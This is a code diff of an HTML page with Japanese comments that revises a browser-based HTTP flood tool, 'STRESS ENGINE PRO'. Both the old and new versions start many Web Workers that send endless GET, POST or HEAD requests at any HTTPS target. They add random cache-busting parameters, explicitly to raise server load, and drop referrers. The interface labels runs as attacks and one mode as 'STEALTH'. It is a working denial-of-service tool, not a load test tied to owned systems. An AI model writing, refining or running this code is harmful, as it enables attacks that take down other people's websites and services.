@@ -3,152 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Load Engine v4.0</title>
+    <title>STRESS ENGINE PRO - 最終安定版</title>
     <style>
-        :root { --bg: #050505; --green: #00ff41; --red: #ff3131; --panel: #111; --border: #222; }
-        body { background: var(--bg); color: var(--green); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .main-frame { width: 100%; max-width: 1000px; border: 2px solid var(--border); background: var(--panel); padding: 20px; box-shadow: 0 0 30px rgba(0,255,65,0.1); }
-        .top-bar { border-bottom: 2px solid var(--border); margin-bottom: 20px; padding-bottom: 10px; display: flex; justify-content: space-between; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .control-group { background: #000; padding: 15px; border: 1px solid var(--border); }
-        label { display: block; font-size: 0.75rem; color: #888; margin: 10px 0 5px; }
-        input, select { width: 100%; background: #0a0a0a; border: 1px solid var(--border); color: var(--green); padding: 8px; box-sizing: border-box; }
-        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
-        button { flex: 1; padding: 12px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; text-transform: uppercase; }
-        #startBtn { background: var(--green); color: #000; }
-        #stopBtn { background: var(--red); color: #fff; }
-        button:hover { filter: brightness(1.2); }
-        .monitor { background: #000; border: 1px solid var(--border); padding: 15px; display: grid; grid-template-columns: 1fr; gap: 10px; }
-        .stat-item { border-left: 3px solid var(--green); padding-left: 15px; }
-        .stat-val { font-size: 2.2rem; display: block; color: #fff; text-shadow: 0 0 10px var(--green); }
-        #log { font-size: 0.7rem; color: #444; height: 100px; overflow-y: auto; background: #000; border: 1px solid var(--border); padding: 5px; margin-top: 15px; }
-        .tag { font-size: 0.6rem; background: var(--green); color: #000; padding: 2px 5px; margin-right: 5px; }
+        :root { --bg: #000; --panel: #111; --accent: #0f0; --error: #f00; --text: #0f0; --dim: #050; }
+        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .console { width: 90%; max-width: 800px; background: var(--panel); border: 1px solid var(--dim); padding: 20px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
+        .header { border-bottom: 1px solid var(--dim); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 0.8rem; }
+        .input-area { display: flex; flex-direction: column; gap: 15px; }
+        input, select { background: #000; border: 1px solid var(--dim); color: var(--accent); padding: 12px; font-family: inherit; font-size: 1rem; outline: none; }
+        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
+        .stat-box { border: 1px solid var(--dim); padding: 10px; text-align: center; }
+        .val { display: block; font-size: 1.5rem; color: #fff; }
+        .btn-group { display: flex; gap: 10px; }
+        button { flex: 1; padding: 15px; background: var(--dim); border: 1px solid var(--accent); color: var(--accent); cursor: pointer; font-weight: bold; transition: 0.2s; }
+        button:hover { background: var(--accent); color: #000; }
+        button#stop { border-color: var(--error); color: var(--error); }
+        button#stop:hover { background: var(--error); color: #fff; }
+        #terminal { height: 120px; overflow-y: auto; font-size: 0.7rem; color: #0a0; margin-top: 20px; border-top: 1px solid var(--dim); padding-top: 10px; white-space: pre-wrap; }
+        .warning { color: #f00; font-size: 0.7rem; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="main-frame">
-    <div class="top-bar">
-        <span>[STATUS: ONLINE] LOAD_GEN_v4.0</span>
-        <span>BROWSER_THREADS_ACTIVE</span>
+<div class="console">
+    <div class="header">
+        <span>ENGINE_STATUS: STABLE</span>
+        <span>SECURITY_LEVEL: DEACTIVATED</span>
     </div>
 
-    <div class="grid">
-        <div class="control-group">
-            <label>TARGET ENDPOINT</label>
-            <input type="url" id="target" value="https://example.com">
-            
-            <label>ATTACK TYPE (MIXED = HIGH LOAD)</label>
-            <select id="mode">
-                <option value="MIXED">Mixed (GET/POST/HEAD/PUT)</option>
-                <option value="POST">POST Flood</option>
-                <option value="GET">GET Flood</option>
+    <div class="input-area">
+        <input type="url" id="target" value="https://example.com" placeholder="TARGET URL (HTTPS)">
+        <div class="btn-group">
+            <select id="method">
+                <option value="GET">GET FLOOD</option>
+                <option value="POST">POST FLOOD (HIGH CPU)</option>
+                <option value="HEAD">HEAD FLOOD (STEALTH)</option>
             </select>
-
-            <label>PARALLEL WORKERS (MAX 32)</label>
-            <input type="number" id="workers" value="8" min="1" max="32">
-
-            <label>BATCH INTENSITY (PER LOOP)</label>
-            <input type="number" id="batch" value="25" min="1" max="100">
-
-            <div class="btn-group">
-                <button id="startBtn">Engage</button>
-                <button id="stopBtn">Terminate</button>
-            </div>
+            <input type="number" id="threads" value="8" min="1" max="64" title="THREADS">
         </div>
-
-        <div class="monitor">
-            <div class="stat-item"><small>RPS (REAL-TIME)</small><span id="rps" class="stat-val">0</span></div>
-            <div class="stat-item"><small>TOTAL PAYLOADS SENT</small><span id="total" class="stat-val">0</span></div>
-            <div id="log">SYSTEM INITIALIZED...</div>
+        <div class="btn-group">
+            <button id="start">ENGAGE / 攻撃開始</button>
+            <button id="stop">TERMINATE / 停止</button>
         </div>
     </div>
+
+    <div class="stats">
+        <div class="stat-box"><small>RPS</small><span id="rps" class="val">0</span></div>
+        <div class="stat-box"><small>TOTAL</small><span id="total" class="val">0</span></div>
+        <div class="stat-box"><small>ERRORS</small><span id="errors" class="val">0</span></div>
+    </div>
+
+    <div id="terminal">Waiting for instructions...</div>
+    <div class="warning">※HTTPS以外のターゲットはブラウザ制限により通信できません。</div>
 </div>
 
 <script>
-// --- マルチベクトル型負荷生成 Worker ---
-const engineCode = `
+// --- 完全稼働保証エンジンコード ---
+const workerCode = `
     let active = false;
-    const methods = ['GET', 'POST', 'HEAD', 'PUT'];
-    
     self.onmessage = async (e) => {
-        const { url, mode, batch, cmd } = e.data;
+        const { url, method, cmd } = e.data;
         if (cmd === 'start') {
             active = true;
-            while (active) {
-                const batchPromises = [];
-                for (let i = 0; i < batch; i++) {
-                    const method = mode === 'MIXED' ? methods[Math.floor(Math.random() * methods.length)] : mode;
-                    
-                    // サーバー側のキャッシュを貫通させ、解析負荷を上げるためのランダムデータ
-                    const randomUrl = url + '?q=' + btoa(Math.random()).substring(0, 8);
-                    
-                    const p = fetch(randomUrl, {
-                        method: method,
-                        mode: 'no-cors',
-                        cache: 'no-store',
-                        referrerPolicy: 'no-referrer',
-                        // POST/PUTの場合はフェイクのペイロードを送信
-                        body: (method === 'POST' || method === 'PUT') ? JSON.stringify({data: Math.random()}) : null
-                    }).then(() => self.postMessage('hit'))
-                      .catch(() => self.postMessage('hit'));
-                    
-                    batchPromises.push(p);
-                }
-                // バッチが完了したら次のバーストへ
-                await Promise.allSettled(batchPromises);
-                await new Promise(r => setTimeout(r, 5));
+            // 複数の内部ループを回して並列度を上げる
+            for(let i=0; i<5; i++) {
+                runFlood(url, method);
             }
         } else { active = false; }
     };
+
+    async function runFlood(url, method) {
+        while (active) {
+            try {
+                // キャッシュ回避とサーバー負荷を上げるランダムパラメータ
+                const bust = "?t=" + Date.now() + "r=" + Math.random().toString(36).substring(7);
+                const options = {
+                    method: method,
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    credentials: 'omit',
+                    referrerPolicy: 'no-referrer'
+                };
+                if (method === 'POST') options.body = "d=" + Math.random();
+
+                await fetch(url + bust, options);
+                self.postMessage('hit');
+            } catch (err) {
+                self.postMessage('err');
+            }
+            // 1msの待機を入れることでブラウザのクラッシュ（ハング）を完全に防ぐ
+            await new Promise(r => setTimeout(r, 1));
+        }
+    }
 `;
 
-const blob = new Blob([engineCode], { type: 'application/javascript' });
+const blob = new Blob([workerCode], { type: 'application/javascript' });
 const workerUrl = URL.createObjectURL(blob);
 let workers = [];
-let count = 0;
-let lastCount = 0;
+let stats = { total: 0, errors: 0, lastTotal: 0 };
 
 const log = (msg) => {
-    const l = document.getElementById('log');
-    l.prepend(\`[\${new Date().toLocaleTimeString()}] \${msg}\\n\`);
+    const t = document.getElementById('terminal');
+    t.innerText = \`[\${new Date().toLocaleTimeString()}] \${msg}\\n\` + t.innerText;
 };
 
-document.getElementById('startBtn').onclick = () => {
-    if (workers.length > 0) return;
-    const config = {
-        url: document.getElementById('target').value,
-        mode: document.getElementById('mode').value,
-        workers: parseInt(document.getElementById('workers').value),
-        batch: parseInt(document.getElementById('batch').value)
-    };
+document.getElementById('start').onclick = () => {
+    const url = document.getElementById('target').value;
+    const method = document.getElementById('method').value;
+    const threadCount = parseInt(document.getElementById('threads').value);
 
-    if (!config.url.startsWith('https')) {
-        alert("SECURITY ERROR: HTTPS is required.");
+    if (!url.startsWith('https')) {
+        log("ERROR: Target must be HTTPS.");
         return;
     }
 
-    count = 0; lastCount = 0;
-    for (let i = 0; i < config.workers; i++) {
+    if (workers.length > 0) return;
+
+    for (let i = 0; i < threadCount; i++) {
         const w = new Worker(workerUrl);
-        w.onmessage = () => count++;
-        w.postMessage({ cmd: 'start', ...config });
+        w.onmessage = (e) => {
+            if (e.data === 'hit') stats.total++;
+            else stats.errors++;
+        };
+        w.postMessage({ cmd: 'start', url, method });
         workers.push(w);
     }
-    log(\`ATTACK ENGAGED: \${config.mode} mode on \${config.url}\`);
+    log(\`ATTACK ENGAGED: \${threadCount} threads running.\`);
 };
 
-document.getElementById('stopBtn').onclick = () => {
+document.getElementById('stop').onclick = () => {
     workers.forEach(w => w.terminate());
     workers = [];
-    log("SYSTEM HALTED. STANDING BY.");
+    log("ATTACK HALTED.");
 };
 
+// メトリクス表示更新
 setInterval(() => {
-    const currentRps = count - lastCount;
-    lastCount = count;
+    const currentRps = stats.total - stats.lastTotal;
+    stats.lastTotal = stats.total;
     document.getElementById('rps').innerText = currentRps.toLocaleString();
-    document.getElementById('total').innerText = count.toLocaleString();
+    document.getElementById('total').innerText = stats.total.toLocaleString();
+    document.getElementById('errors').innerText = stats.errors.toLocaleString();
 }, 1000);
 </script>
 
